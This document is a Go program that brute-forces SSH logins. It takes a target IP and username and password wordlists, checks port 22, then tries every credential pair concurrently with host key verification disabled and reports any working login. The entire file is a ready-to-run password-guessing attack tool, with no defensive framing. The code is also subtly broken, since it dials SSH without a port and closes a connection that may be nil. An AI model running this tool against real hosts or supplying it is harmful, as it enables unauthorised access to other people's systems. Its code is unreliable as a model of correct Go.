package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os"
	"sync"
	"time"
)

var ip string

var userfile string
var passfile string
const THREADS = 8
var pipeline = make(chan int, THREADS)



	


func main() {

	if len(os.Args) < 4 {

		fmt.Println("USAGE : ./bc [IP address][usernamelist] [passwordlist]")
		os.Exit(1)
	}else{

		ip = os.Args[1]
		userfile = os.Args[2]
		passfile = os.Args[3] 		
	}

	//fmt.Println(len(os.Args))

	var wg sync.WaitGroup

	knock(ip)

	users, err := readFile(userfile)
	if err != nil {
		log.Println("Cant read username files...exiting")
		os.Exit(1)
	}

	passwords, err := readFile(passfile)
	if err != nil {
		log.Println("Cant read password file....exiting")
		os.Exit(1)
	}

	for _, user := range users {

		for _, pass := range passwords {

			pipeline <- 0

			wg.Add(1)

			go ssh_connect(&wg, user, pass)

		}
	}
	wg.Wait()

}



func readFile(file string) (data []string, err error) {

	buffer, err := os.Open(file)
	if err != nil {
		return
	}

	defer buffer.Close()

	scanner := bufio.NewScanner(buffer)
	for scanner.Scan() {
		data = append(data, scanner.Text())
		//fmt.Println(data)
	}

	return
}

func knock(ipad string) {

	ipad = ip + ":22"
	conn, err := net.Dial("tcp", ipad)
	if err != nil {
		fmt.Println("Is the port open ? or are you connected to the internet")

	} else {
		fmt.Println(" PORT 22 ::: IS UP")

	}
	conn.Close()
}

func ssh_connect(wg *sync.WaitGroup, user, pass string) {
	defer wg.Done()

	fmt.Printf("Trying %s :: %s\n", user, pass)
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()

	connect, err := ssh.Dial("tcp", ip, sshConfig)

	if err != nil {

		
		<- pipeline

		return
	}

	defer connect.Close()

	fmt.Printf("USERNAME AND PASSWORD FOUND -> %s:%s\n", user, pass)

	<- pipeline
	

}
